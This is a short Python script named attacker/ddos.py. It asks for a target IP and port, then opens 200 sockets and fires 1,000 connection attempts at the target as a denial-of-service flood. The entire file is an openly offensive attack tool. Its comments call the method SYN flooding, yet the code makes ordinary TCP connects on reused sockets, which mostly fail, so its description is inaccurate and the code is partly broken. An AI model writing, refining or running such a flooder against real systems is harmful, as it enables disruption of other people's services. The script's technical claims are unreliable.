# attacker/ddos.py
import socket
import time
import random

def ddos_attack():
    victim_ip = input("Enter target IP: ")
    victim_port = int(input("Enter target port: "))
    
    print(f"[+] Starting DDoS attack against {victim_ip}:{victim_port}")
    
    # Create multiple sockets for flooding
    sockets = []
    
    try:
        for i in range(200):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            sockets.append(s)
        
        # Perform SYN flooding
        for _ in range(1000):
            # Use random socket for each attempt
            s = random.choice(sockets)
            try:
                s.connect((victim_ip, victim_port))
            except:
                # Expected to fail in many cases
                pass
            time.sleep(0.01)
            
        print("[+] DDoS attack completed")
        
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted")
    finally:
        # Clean up sockets
        for s in sockets:
            try:
                s.close()
            except:
                pass

if __name__ == "__main__":
    ddos_attack()
